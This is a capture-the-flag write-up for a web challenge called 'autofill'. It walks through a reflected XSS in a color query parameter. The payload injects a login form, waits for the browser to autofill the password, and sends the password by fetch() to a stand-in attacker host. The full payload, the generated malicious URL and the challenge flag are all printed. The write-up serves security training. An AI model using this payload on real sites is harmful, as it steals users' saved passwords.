# Writeup for `autofill`

|      author     | category | value |
|-----------------|----------|-------|
| Ixbixbam        | web      |  361  |

My colleague's web browser autofills his password whenever he loads a page. Can you find his password?

## Solution

<details>
<summary>Click here to reveal the solution!</summary>

### Walkthrough

The index page loads the color variable as a URL query parameter and adds it directly to the page's HTML, as can be seen in index.html:41 ```$("#app").html(`<div id="colorBox" style="background-color: ${color}"></div>`);```.
This means that we can achieve XSS by injecting HTML into the page. 
We can achieve a simple XSS by setting the color parameter to `blue"></div><img src=x onerror="alert(1)"><div style="color: blue`.

Unlike most XSS challenges we aren't trying to find the document's cookie, instead we are attempting to find the user's password which their browser autofills. To do this, we can dynamically add the login form's HTML to the page and wait 2 seconds for the user to interact with the page and for Chromium to fill the input with the password.

Note that `https://attacker.owned.server` will need be a website that you can see the logs for. You may want to use webhook.site.

Javascript to generate malicious URL: ```copy("http://localhost:3000/index.html?color=" + encodeURIComponent(`blue"></div><img src=x onerror="$(\`#color-name\`).html(\`<input type='username'></input><input type='password'></input>\`);setTimeout(()=>{fetch(\`https://attacker.owned.server?flag=\`+$(\`input[type=password]\`).val());},2000);"><div style="color: blue`))```.

Malicious URL:
https://autofill-web.k17.kctf.cloud/index.html?color=blue%22%3E%3C%2Fdiv%3E%3Cimg%20src%3Dx%20onerror%3D%22%24(%60%23color-name%60).html(%60%3Cinput%20type%3D'username'%3E%3C%2Finput%3E%3Cinput%20type%3D'password'%3E%3C%2Finput%3E%60)%3BsetTimeout(()%3D%3E%7Bfetch(%60https%3A%2F%2Fattacker.owned.server.com%3Fflag%3D%60%2B%24(%60input%5Btype%3Dpassword%5D%60).val())%3B%7D%2C2000)%3B%22%3E%3Cdiv%20style%3D%22color%3A%20blue

Note that when testing the program locally ensure to run the report page's docker container with --privileged.

### Flag(s)

- `K17{t1me_t0_s3tup_a_prim4ry_pa55w0rd}`

</details>
